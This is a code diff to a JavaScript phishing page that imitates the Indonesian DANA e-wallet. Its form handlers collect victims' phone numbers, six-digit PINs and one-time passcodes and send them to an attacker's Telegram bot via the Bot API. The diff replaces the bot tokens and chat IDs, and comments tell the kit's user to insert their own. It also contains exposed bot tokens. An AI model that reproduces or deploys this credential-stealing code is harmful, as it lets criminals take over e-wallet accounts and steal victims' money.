@@ -1568,8 +1568,8 @@ $(".bgotp").hide();
     
     var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value;
    
-    var token = '7470616275:AAGD16xe41oc03Yr2tr4M0VWt9CjuBNpawA'; // Ganti dengan token bot yang kamu buat
-    var grup = '7440334508'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '8506613880:AAGJtBVuDF-r2c59_6LurpWK8PPpqaZG9j8'; // Ganti dengan token bot yang kamu buat
+    var grup = '8063374047'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -1607,8 +1607,8 @@ function sendPin(){
      
  
 
-    var token = '7470616275:AAGD16xe41oc03Yr2tr4M0VWt9CjuBNpawA'; // Ganti dengan token bot yang kamu buat
-    var grup = '7440334508'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '8506613880:AAGJtBVuDF-r2c59_6LurpWK8PPpqaZG9j8'; // Ganti dengan token bot yang kamu buat
+    var grup = '8063374047'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -1659,8 +1659,8 @@ $(".alert").css("color","red");
     var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝗢𝗧𝗣 𝗗𝗔𝗡𝗔     : ' + otp1.value + otp2.value + otp3.value + otp4.value;
 
 
-    var token = '7470616275:AAGD16xe41oc03Yr2tr4M0VWt9CjuBNpawA'; // Ganti dengan token bot yang kamu buat
-    var grup = '7440334508'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '8506613880:AAGJtBVuDF-r2c59_6LurpWK8PPpqaZG9j8'; // Ganti dengan token bot yang kamu buat
+    var grup = '8063374047'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -1710,7 +1710,7 @@ $(".alert").css("color","red");
     
     var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝗢𝗧𝗣 𝗕𝘂𝗸𝗮𝗹𝗮𝗽𝗮𝗸     : ' + kode1.value + kode2.value + kode3.value + kode4.value + kode5.value;
    
-    var token = '7470616275:AAGD16xe41oc03Yr2tr4M0VWt9CjuBNpawA'; // Ganti dengan token bot yang kamu buat
+    var token = '8506613880:AAGJtBVuDF-r2c59_6LurpWK8PPpqaZG9j8'; // Ganti dengan token bot yang kamu buat
     var grup = '7440334508'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
